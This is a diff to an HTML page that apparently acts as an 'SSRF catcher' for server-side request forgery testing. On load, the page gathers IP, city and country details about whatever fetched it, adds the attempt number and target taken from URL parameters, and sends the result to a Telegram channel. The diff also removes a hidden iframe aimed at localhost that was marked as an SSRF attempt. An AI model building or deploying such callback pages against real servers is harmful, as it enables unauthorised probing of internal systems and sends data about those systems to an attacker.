@@ -24,9 +24,21 @@
       });
     }
 
-    function formatMessage(data) {
+    function getAttemptDetails() {
+      const params = new URLSearchParams(window.location.search);
+      return {
+        attempt: params.get("attempt") || "Unknown",
+        target: decodeURIComponent(params.get("target") || "Unknown")
+      };
+    }
+
+    function formatMessage(data, attemptInfo) {
       return `📄 *[SSRF CATCHER]*
 🌟 *SSRF Confirmed!* Server followed localhost redirect.
+
+🎯 *Attempt #:* ${attemptInfo.attempt}
+🔗 *Target:* ${attemptInfo.target}
+
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
 🌎 *Country:* ${data.country || "Unknown"}
@@ -37,7 +49,8 @@
 
     async function run() {
       const ipData = await getIPInfo();
-      const msg = formatMessage(ipData);
+      const attemptInfo = getAttemptDetails();
+      const msg = formatMessage(ipData, attemptInfo);
       await sendToTelegram(msg);
     }
 
@@ -45,8 +58,6 @@
   </script>
 </head>
 <body>
-  <h1>SSRF Check Complete.</h1>
-  <!-- محاولة SSRF -->
-  <iframe src="http://127.0.0.1:80" style="display:none;"></iframe>
+  <h1>📡 Catcher Stage Triggered</h1>
 </body>
 </html>
